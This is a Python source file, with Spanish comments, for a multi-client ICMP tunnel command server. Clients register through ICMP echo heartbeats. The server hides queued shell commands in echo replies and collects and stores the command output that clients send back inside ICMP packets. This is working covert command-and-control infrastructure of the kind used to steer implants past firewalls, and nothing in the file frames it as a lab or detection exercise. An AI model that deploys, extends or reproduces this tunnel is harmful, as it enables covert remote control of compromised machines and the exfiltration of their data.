import socket
import struct
import time
import threading
import os

# ─────────────────────────────────────────────────────────────
#  Configuración
# ─────────────────────────────────────────────────────────────
COMMANDS_DIR = "commands"   # commands/commands_<client_id>.txt
RESULTS_DIR  = "results"    # results/<client_id>/<cmd>.txt

CLIENT_MAGIC      = 0xCAFE
SERVER_MAGIC      = 0xBEEF
HEARTBEAT_PAYLOAD = b"HB:"
MSG_OK            = b"OK"
MSG_CMD           = b"CMD:"
MSG_RESULT        = b"RESULT:"


def load_commands(client_id: str) -> list:
    path = os.path.join(COMMANDS_DIR, f"commands_{client_id}.txt")
    if not os.path.exists(path):
        print(f"[WARN] No existe {path} — {client_id} no recibirá comandos.")
        return []
    with open(path) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]


def save_result(client_id: str, cmd: str, data: str):
    client_dir = os.path.join(RESULTS_DIR, client_id)
    os.makedirs(client_dir, exist_ok=True)
    safe_name = cmd.replace(" ", "_").replace("/", "-")[:80]
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    path = os.path.join(client_dir, f"{timestamp}_{safe_name}.txt")
    with open(path, "w") as f:
        f.write(f"# Comando : {cmd}\n")
        f.write(f"# Cliente : {client_id}\n")
        f.write(f"# Fecha   : {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(data)
    print(f"[💾] {path}")


# ─────────────────────────────────────────────────────────────
#  Estado por cliente
# ─────────────────────────────────────────────────────────────
class ClientState:
    def __init__(self, client_id: str):
        self.client_id     = client_id
        self.commands      = load_commands(client_id)
        self.index         = 0
        self.current_cmd   = None
        self._lock         = threading.Lock()
        self._result_event = threading.Event()
        self._buffer       = []

    def next_cmd(self):
        if self.index < len(self.commands):
            return self.commands[self.index]
        return None

    def dispatch(self):
        with self._lock:
            self.current_cmd = self.commands[self.index]
            self._result_event.clear()
            self._buffer.clear()

    def append_result(self, data: str):
        with self._lock:
            self._buffer.append(data)

    def signal_result(self):
        self._result_event.set()

    def wait_result(self, timeout=120) -> bool:
        return self._result_event.wait(timeout=timeout)

    def get_result(self) -> str:
        with self._lock:
            return "".join(self._buffer)

    def advance(self):
        with self._lock:
            self.index += 1
            self.current_cmd = None


# ─────────────────────────────────────────────────────────────
#  Servidor
# ─────────────────────────────────────────────────────────────
class ICMPCommandServer:
    def __init__(self, host="0.0.0.0"):
        self.host    = host
        self.sock    = None
        self.running = False
        self._clients: dict = {}
        self._clients_lock  = threading.Lock()

    def _open_socket(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return True
        except PermissionError:
            print("[ERROR] Se necesitan permisos de root / CAP_NET_RAW")
            return False
        except Exception as e:
            print(f"[ERROR] {e}")
            return False

    @staticmethod
    def _checksum(data: bytes) -> int:
        s, i = 0, 0
        while i < len(data) - 1:
            s += (data[i + 1] << 8) + data[i]
            i += 2
        if len(data) & 1:
            s += data[-1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_reply(self, payload: bytes, pid: int, seq: int) -> bytes:
        hdr = struct.pack("!BBHHH", 0, 0, 0, pid, seq)
        ck  = self._checksum(hdr + payload)
        return struct.pack("!BBHHH", 0, 0, ck, pid, seq) + payload

    @staticmethod
    def _parse_request(packet: bytes):
        ip_hlen = (packet[0] & 0x0F) * 4
        icmp = packet[ip_hlen:]
        if len(icmp) < 8:
            return None
        t, _, _, pid, seq = struct.unpack("!BBHHH", icmp[:8])
        if t != 8:
            return None
        return pid, seq, icmp[8:]

    def _get_or_create(self, client_id: str) -> ClientState:
        with self._clients_lock:
            if client_id not in self._clients:
                print(f"\n[+] Nuevo cliente registrado: {client_id}")
                state = ClientState(client_id)
                self._clients[client_id] = state
                threading.Thread(
                    target=self._dispatch_loop,
                    args=(state,),
                    daemon=True,
                ).start()
            return self._clients[client_id]

    def _handle(self, packet: bytes, addr):
        parsed = self._parse_request(packet)
        if parsed is None:
            return
        pid, seq, payload = parsed

        # RESULT:<client_id>:<data>
        if payload.startswith(MSG_RESULT):
            rest = payload[len(MSG_RESULT):]
            sep  = rest.find(b":")
            if sep == -1:
                return
            client_id = rest[:sep].decode("utf-8", errors="replace")
            data      = rest[sep+1:].decode("utf-8", errors="replace")
            with self._clients_lock:
                state = self._clients.get(client_id)
            if state:
                state.append_result(data)
                state.signal_result()
            self.sock.sendto(self._build_reply(MSG_OK, SERVER_MAGIC, seq), addr)
            return

        # HB:<client_id>
        if payload.startswith(HEARTBEAT_PAYLOAD):
            client_id = payload[len(HEARTBEAT_PAYLOAD):].decode("utf-8", errors="replace").strip()
            state = self._get_or_create(client_id)
            with state._lock:
                cmd = state.current_cmd
            response = (MSG_CMD + cmd.encode()) if cmd else MSG_OK
            self.sock.sendto(self._build_reply(response, SERVER_MAGIC, seq), addr)

    def _dispatch_loop(self, state: ClientState):
        total = len(state.commands)
        if total == 0:
            return
        print(f"[{state.client_id}] {total} comandos en cola.")

        for i in range(total):
            cmd = state.next_cmd()
            print(f"\n[{state.client_id} → {i+1}/{total}] {cmd}")
            state.dispatch()

            if not state.wait_result(timeout=120):
                print(f"[{state.client_id}] Timeout: '{cmd}'")
                state.advance()
                continue

            result = state.get_result()
            print(f"[{state.client_id} RESULTADO]\n{result}")
            save_result(state.client_id, cmd, result)
            state.advance()

        print(f"[{state.client_id}] ✓ Lista completada. Keepalive activo.")

    def _receive_loop(self):
        self.sock.settimeout(1.0)
        while self.running:
            try:
                pkt, addr = self.sock.recvfrom(65535)
                self._handle(pkt, addr)
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[ERROR] {e}")

    def start(self):
        if not self._open_socket():
            return
        os.makedirs(COMMANDS_DIR, exist_ok=True)
        os.makedirs(RESULTS_DIR,  exist_ok=True)
        self.running = True
        print("=" * 45)
        print("  Servidor ICMP Tunnel  (multi-cliente)")
        print("=" * 45)
        print(f"Comandos  : {COMMANDS_DIR}/commands_<id>.txt")
        print(f"Resultados: {RESULTS_DIR}/<id>/<cmd>.txt\n")
        try:
            self._receive_loop()
        except KeyboardInterrupt:
            print("\nServidor detenido.")
        finally:
            self.running = False
            self.sock.close()


if __name__ == "__main__":
    ICMPCommandServer().start()